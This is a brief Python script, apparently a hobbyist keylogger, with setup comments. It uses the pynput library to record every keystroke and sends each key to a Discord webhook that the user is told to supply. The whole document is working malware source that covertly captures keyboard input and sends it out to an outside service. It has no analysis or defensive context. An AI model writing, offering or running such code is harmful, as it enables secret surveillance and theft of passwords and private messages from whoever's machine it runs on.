from pynput.keyboard import Listener #pip install pynput
from discord_webhook import DiscordWebhook, DiscordEmbed #pip install discord-webhook

hook = "" #put ur webhook in the  "" 

def writefile(key):
    try:
        letter = str(key)
        webhook = DiscordWebhook(url=hook, content=letter)
        response = webhook.execute()
    except KeyError:
        pass

with Listener(on_press=writefile) as lis:
    lis.join()
